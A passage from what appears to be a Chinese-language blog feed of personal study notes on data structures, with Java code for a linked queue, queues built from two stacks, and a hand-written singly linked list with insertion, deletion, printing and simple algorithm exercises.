<span class="title function_">size</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> Arrays.toString(queue);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="队列的链式实现"><a href="#队列的链式实现" class="headerlink" title="队列的链式实现"></a>队列的链式实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 含头结点(头结点不存储值,添加操作O(1))，尾指针(删除操作O(1))</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedQueue</span>&lt;E&gt; &#123;</span><br><span class="line"><span class="keyword">private</span> Node&lt;E&gt; head;  <span class="comment">// 头结点</span></span><br><span class="line"><span class="keyword">private</span> Node&lt;E&gt; rear;   <span class="comment">// 尾指针</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> size;   <span class="comment">// 队列大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LinkedQueue</span><span class="params">()</span>&#123;</span><br><span class="line">head = rear = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;E&gt;(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 添加元素到队尾</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(E data)</span>&#123;</span><br><span class="line">Node&lt;E&gt; node = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;E&gt;(data);</span><br><span class="line">rear.next = node;</span><br><span class="line">rear = node;</span><br><span class="line">size ++;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 删除队头并返回队头元素的值</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!isEmpty())&#123;</span><br><span class="line"><span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">Node&lt;E&gt; temp = head.next;</span><br><span class="line">head.next = temp.next;</span><br><span class="line">e = temp.data;</span><br><span class="line"></span><br><span class="line">temp.data = <span class="literal">null</span>;</span><br><span class="line">temp.next = <span class="literal">null</span>;</span><br><span class="line">size--;</span><br><span class="line"><span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 返回队头元素的值</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> head.next.data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 队列是否为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 队列大小</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">Node&lt;E&gt; cur = head.next;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">sb.append(cur.data).append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="队列的相关算法题"><a href="#队列的相关算法题" class="headerlink" title="队列的相关算法题"></a>队列的相关算法题</h3><h4 id="使用两个栈模拟一个队列"><a href="#使用两个栈模拟一个队列" class="headerlink" title="使用两个栈模拟一个队列"></a>使用两个栈模拟一个队列</h4><p>其中一个栈作存储空间，另一个栈作临时缓冲区</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StackQueue</span>&lt;E&gt; &#123;</span><br><span class="line"><span class="keyword">private</span> Stack&lt;E&gt; stack1;    <span class="comment">// 存储空间</span></span><br><span class="line"><span class="keyword">private</span> Stack&lt;E&gt; stack2;  <span class="comment">//临时缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">StackQueue</span><span class="params">()</span> &#123;</span><br><span class="line">stack1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;E&gt;();</span><br><span class="line">stack2 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;E&gt;();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 添加元素到队尾。先检查stack2是否为空：若为空，则直接对stack1执行压栈操作;否则，先将stack2中的元素倒回stack1，再对stack1执行压栈操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(E e)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!stack2.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">while</span> (stack2.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">stack1.push(stack2.pop().getData());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">stack1.push(e);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 删除队头并返回队头元素的值。先检查stack2是否为空：若为空，先将stack1中的size-1个元素倒回stack2，再对stack1中栈底元素执行弹栈操作;否则，则直接对stack2执行弹栈操作</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (stack2.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">if</span> (!stack1.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">while</span> (stack1.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">stack2.push(stack1.pop().getData());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> stack1.pop().getData();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> stack2.pop().getData();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!stack1.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(stack1.toString()).reverse().toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> stack2.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更优解：使用两个栈模拟一个队列，其中一个栈专门用作入队(始终不执行出队操作)，另一个栈专门用作出队(始终不执行入队操作)<br>此种解法相对于StackQueue性能要高不少，避免了反复“倒”栈，仅在需要时才“倒”一次</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OptimizationStackQueue</span>&lt;E&gt; &#123;</span><br><span class="line"><span class="keyword">private</span> LinkedStack&lt;E&gt; stack1; <span class="comment">// 入队栈</span></span><br><span class="line"><span class="keyword">private</span> LinkedStack&lt;E&gt; stack2; <span class="comment">// 出队栈</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">OptimizationStackQueue</span><span class="params">()</span> &#123;</span><br><span class="line">stack1 = <span class="keyword">new</span> <span class="title class_">LinkedStack</span>&lt;E&gt;();</span><br><span class="line">stack2 = <span class="keyword">new</span> <span class="title class_">LinkedStack</span>&lt;E&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素到队尾,直接对stack1执行压栈操作。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(E e)</span> &#123;</span><br><span class="line">stack1.push(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除队头并返回队头元素的值。先检查stack2是否为空：若为空，先将stack1中的元素全部倒回stack2，再对stack2执行弹栈操作;否则，则直接对stack2执行弹栈操作</span></span><br><span class="line"><span class="keyword">public</span> E <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (stack2.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">while</span> (!stack1.isEmpty()) &#123;</span><br><span class="line">stack2.push(stack1.pop().getData());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> stack2.pop().getData();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">if</span> (!stack2.isEmpty()) &#123;</span><br><span class="line">sb.append(stack2.toString());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.append(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(stack1.toString()).reverse().toString()).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人学习小结，其中可能有错误，还望在下方评论指出 &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈和队列</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表LinkedList</title>
    <link href="/2023/06/18/%E9%93%BE%E8%A1%A8LinkedList/"/>
    <url>/2023/06/18/%E9%93%BE%E8%A1%A8LinkedList/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>链表在Java中有现成的类可以使用，就是LinkedList类，类中有增删改查等一系列方法，但是在学习数据结构的过程中发现很多关于链表的题目都涉及到自己实现链表以及增删反转等操作，因此单独拎出来写一篇关于链表的笔记。</p><h2 id="节点的实现"><a href="#节点的实现" class="headerlink" title="节点的实现"></a>节点的实现</h2><p>链表这个数据结构主要由结点构成，需要先有一个节点类，以单链表为例，节点储存着两个数据，分别为值（任意数据类型），后节点（数据类型为节点），这样便可以通过一个节点访问整个链表中的元素。<br>节点类代码实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt; &#123;</span><br><span class="line">Node&lt;T&gt; next;   </span><br><span class="line">T data;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T data)</span> &#123; </span><br><span class="line"><span class="built_in">this</span>.data = data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查阅这方面资料时发现有Node&lt; T &gt;这样的类型出现，查阅了一下，这里的T代表的是Java泛型通配符。泛型的好处就是省去了强制转换，可以在编译时候检查类型安全，可以用在类，方法，接口上，与T相似的还有：<br>？ 表示不确定的java类型<br>T (type) 表示具体的一个java类型<br>K V (key value) 分别代表java键值中的Key Value<br>E (element) 代表元素</p><h2 id="链表的实现"><a href="#链表的实现" class="headerlink" title="链表的实现"></a>链表的实现</h2><p>有了节点类之后，就可以用节点类来实现链表，并在链表类中实现增删等等操作。链表类最重要的两个元素就是链表的表头和链表的大小。</p><p>代码中head为表头，但是这个表头是不存放数据的，只指向下一个节点，查阅资料可知该节点存在使得空链表与非空链表处理一致，也方便对链表的开始结点的插入或删除操作。<strong>但是在LeetCode等算法题中所用的链表的头节点均是存放数据的。</strong></p><h3 id="链表的基础实现代码"><a href="#链表的基础实现代码" class="headerlink" title="链表的基础实现代码"></a>链表的基础实现代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LinkedList</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Node&lt;E&gt; head; <span class="comment">// 链表表头</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> size; <span class="comment">// 链表大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">head = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;E&gt;(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">getHead</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h3><h4 id="向链表中指定位置插入元素-0-size-返回新节点"><a href="#向链表中指定位置插入元素-0-size-返回新节点" class="headerlink" title="向链表中指定位置插入元素(0 - size),返回新节点"></a>向链表中指定位置插入元素(0 - size),返回新节点</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">add</span><span class="params">(E data, <span class="type">int</span> index)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; size) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;超出范围...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node&lt;E&gt; cur = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    Node&lt;E&gt; temp = cur.next;</span><br><span class="line">    Node&lt;E&gt; node = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;E&gt;(data); <span class="comment">// 将新元素链入链表</span></span><br><span class="line">    cur.next = node;</span><br><span class="line">    cur.next.next = temp;</span><br><span class="line">    size++;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="向链表末尾添加元素-返回新节点"><a href="#向链表末尾添加元素-返回新节点" class="headerlink" title="向链表末尾添加元素,返回新节点"></a>向链表末尾添加元素,返回新节点</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">add</span><span class="params">(E data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> add(data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="向链表尾部添加新节点"><a href="#向链表尾部添加新节点" class="headerlink" title="向链表尾部添加新节点"></a>向链表尾部添加新节点</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node&lt;E&gt; node)</span>&#123;</span><br><span class="line">    Node&lt;E&gt; cur = head;</span><br><span class="line">    <span class="keyword">while</span>(cur.next != <span class="literal">null</span>)&#123;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    cur.next = node;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(node != <span class="literal">null</span>)&#123;</span><br><span class="line">        size ++;</span><br><span class="line">        node = node.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>在自己敲代码的时候发现了一个问题：让链表cur等于链表head,然后修改cur的下一个节点，为什么head的下一个节点也会变，开始还以为是浅拷贝的缘故，但cur是新建的一个对线，不应该是浅拷贝，后面才想通了。因为cur和head的下一个节点指向的为同一个(节点)对象，所以修改cur的next节点会导致head的next节点跟着修改。</p><h4 id="删除链表中指定位置的元素-0-size-1"><a href="#删除链表中指定位置的元素-0-size-1" class="headerlink" title="删除链表中指定位置的元素(0 ~ size-1)"></a>删除链表中指定位置的元素(0 ~ size-1)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt; size - <span class="number">1</span> || index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;超出范围...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node&lt;E&gt; cur = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node&lt;E&gt; temp = cur.next;</span><br><span class="line">    cur.next = temp.next;</span><br><span class="line"></span><br><span class="line">    size--;</span><br><span class="line">    <span class="keyword">return</span> temp.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="向链表末尾删除元素"><a href="#向链表末尾删除元素" class="headerlink" title="向链表末尾删除元素"></a>向链表末尾删除元素</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> remove(size - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输出单链表"><a href="#输出单链表" class="headerlink" title="输出单链表"></a>输出单链表</h3><h4 id="从头到尾输出单链表"><a href="#从头到尾输出单链表" class="headerlink" title="从头到尾输出单链表"></a>从头到尾输出单链表</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">    Node&lt;E&gt; cur = head.next;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.print(cur.data + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从尾到头输出单链表-递归法"><a href="#从尾到头输出单链表-递归法" class="headerlink" title="从尾到头输出单链表(递归法)"></a>从尾到头输出单链表(递归法)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reversePrint</span><span class="params">(Node&lt;E&gt; head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        reversePrint(head.next); <span class="comment">// 不断&quot;递去&quot;</span></span><br><span class="line">        System.out.print(head.next.data + <span class="string">&quot; &quot;</span>); <span class="comment">// &quot;归来&quot;开始打印</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链表的基础算法题"><a href="#链表的基础算法题" class="headerlink" title="链表的基础算法题"></a>链表的基础算法题</h3><h4 id="删除链表中的重复元素-外循环-内循环"><a href="#删除链表中的重复元素-外循环-内循环" class="headerlink" title="删除链表中的重复元素(外循环 + 内循环)"></a>删除链表中的重复元素(外循环 + 内循环)</h4><p>时间复杂度：O(n^2)<br>我感觉这个写的不是最优解，后面再补充更好的解法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeDuplicateNodes</span><span class="params">()</span> &#123;</span><br><span class="line">    Node&lt;E&gt; cur = head.next;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123; <span class="comment">// 外循环</span></span><br><span class="line">        Node&lt;E&gt; temp = cur;</span><br><span class="line">        <span class="keyword">while</span> (temp != <span class="literal">null</span> &amp;&amp; temp.next != <span class="literal">null</span>) &#123; <span class="comment">// 内循环</span></span><br><span class="line">            <span class="keyword">if</span> (cur.data.equals(temp.next.data)) &#123;</span><br><span class="line">                Node&lt;E&gt; duplicateNode = temp.next;</span><br><span class="line">                temp.next = duplicateNode.next;</span><br><span class="line">                size --;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!cur.data.equals(temp.next.data)) &#123;</span><br><span class="line">                temp = temp.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="找出单链表中倒数第K个元素-双指针法-相差K-1步"><a href="#找出单链表中倒数第K个元素-双指针法-相差K-1步" class="headerlink" title="找出单链表中倒数第K个元素(双指针法,相差K-1步)"></a>找出单链表中倒数第K个元素(双指针法,相差K-1步)</h4><p>时间复杂度：O(n)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">getEndK</span><span class="params">(<span class="type">int</span> k)</span> &#123;</span><br><span class="line">    Node&lt;E&gt; pre = head.next;</span><br><span class="line">    Node&lt;E&gt; post = head.next;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; k; i++) &#123; <span class="comment">// pre先走k-1步</span></span><br><span class="line">        <span class="keyword">if</span> (pre != <span class="literal">null</span>) &#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pre != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 